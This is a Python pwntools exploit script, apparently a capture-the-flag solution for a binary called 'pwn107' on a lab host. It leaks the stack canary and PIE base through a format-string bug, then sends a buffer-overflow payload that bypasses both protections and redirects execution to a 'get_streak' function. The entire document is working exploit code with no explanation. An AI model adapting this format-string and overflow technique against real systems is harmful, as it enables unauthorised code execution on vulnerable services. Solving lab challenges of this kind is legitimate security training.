#!/usr/bin/env python3

from pwn import *

elf = context.binary = ELF('./pwn107.pwn107')

io = remote('10.10.250.134', 9007)
#io = process()


stack_leak = b'%13$p'
pie_leak = b'%19$p'
io.sendlineafter(b'?', stack_leak + b' ' + pie_leak)
io.recvuntil(b'Your current streak: ')

leak = io.recvline().split()
canary = int(leak[0], 16)
leakedpie = int(leak[1], 16)
info("Canary address: %#x", canary)
info("Leaked Pie address: %#x", leakedpie)


elf.address = leakedpie - 0x992
info("Piebase address: %#x", elf.address)

ret_streak = elf.symbols.get_streak
payload = flat([b"A"*24 + p64(canary) + b"B"*8 + p64(elf.address + 0x6fe) + p64(ret_streak)])


io.sendline(payload)
io.interactive()
